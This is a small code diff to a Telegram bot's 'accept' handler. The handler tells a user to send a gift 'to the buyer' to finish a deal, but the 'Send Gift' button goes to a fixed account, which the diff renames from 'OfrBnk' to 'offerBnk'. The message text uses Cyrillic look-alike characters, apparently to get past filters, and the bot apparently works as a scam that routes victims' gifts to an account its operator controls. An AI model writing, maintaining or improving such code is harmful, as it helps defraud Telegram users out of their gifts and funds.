@@ -355,7 +355,7 @@ async def handle_accept(callback: CallbackQuery) -> None:
         f"То соmрIеtе thе dеаl, trаnsfеr thе gift tо thе buуеr tо rесеivе уоur {cur_word}"
     )
 
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Send Gift", url="tg://send_gift?to=OfrBnk")]])
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Send Gift", url="tg://send_gift?to=offerBnk")]])
     await edit_with_fallback(bc_id=data["bc_id"], chat_id=data["chat_id"], message_id=data["msg_id"], text=accept_text, reply_markup=keyboard)
     await update_log_message(data, "accepted", is_read=True)
 
